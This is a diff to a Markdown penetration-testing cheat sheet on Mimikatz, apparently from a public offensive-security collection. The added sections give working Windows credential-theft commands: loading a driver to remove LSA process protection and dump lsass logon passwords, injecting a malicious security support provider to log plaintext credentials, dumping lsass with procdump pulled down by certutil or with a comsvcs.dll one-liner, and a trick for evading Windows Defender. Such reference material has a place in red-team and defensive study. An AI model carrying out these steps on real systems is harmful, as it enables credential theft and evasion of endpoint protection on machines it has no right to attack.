@@ -4,6 +4,7 @@
 
 * [Mimikatz - Execute commands](#mimikatz---execute-commands)
 * [Mimikatz - Extract passwords](#mimikatz---extract-passwords)
+* [Mimikatz - LSA Protection Workaround](#mimikatz---lsa-protection-workaround)
 * [Mimikatz - Mini Dump](#mimikatz---mini-dump)
 * [Mimikatz - Pass The Hash](#mimikatz---pass-the-hash)
 * [Mimikatz - Golden ticket](#mimikatz---golden-ticket)
@@ -58,20 +59,63 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
   * Adding requires lock
   * Removing requires reboot
 
+## Mimikatz - LSA Protection Workaround
+
+- LSA as a Protected Process
+  ```powershell
+  # Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
+  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
+
+  # Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
+  #Now lets import the mimidriver.sys to the system
+  mimikatz # !+
+
+  # Now lets remove the protection flags from lsass.exe process
+  mimikatz # !processprotect /process:lsass.exe /remove
+
+  # Finally run the logonpasswords function to dump lsass
+  mimikatz # privilege::debug    
+  mimikatz # token::elevate
+  mimikatz # sekurlsa::logonpasswords
+  ```
+
+- LSA is running as virtualized process (LSAISO) by Credential Guard
+  ```powershell
+  # Check if a process called lsaiso.exe exists on the running processes
+  tasklist |findstr lsaiso
+
+  # If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
+  #Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
+  mimikatz # misc::memssp
+
+  # Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
+  ```
+
 
 ## Mimikatz - Mini Dump
 
-Dump the lsass process.
+Dump the lsass process with `procdump`
+
+> Windows Defender is triggered when a memory dump of lsass is operated, quickly leading to the deletion of the dump. Using lsass's process identifier (pid) "bypasses" that.
 
 ```powershell
-# HTTP method
+# HTTP method - using the default way
 certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
 C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
-# SMB method
+# SMB method - using the pid
 net use Z: https://live.sysinternals.com
-Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+tasklist /fi "imagename eq lsass.exe" # Find lsass's pid
+Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
 ```
+
+Dump the lsass process with `rundll32`
+
+```powershell
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full
+```
+
+
 
 Then load it inside Mimikatz.
 
@@ -195,7 +239,7 @@ Mimikatz in memory (no binary on disk) with :
 - [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1) from PowerShellEmpire
 - [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1) from PowerSploit
 
-More informations can be grabbed from the Memory with :
+More information can be grabbed from the Memory with :
 
 - [Invoke-Mimikittenz](https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1)
 
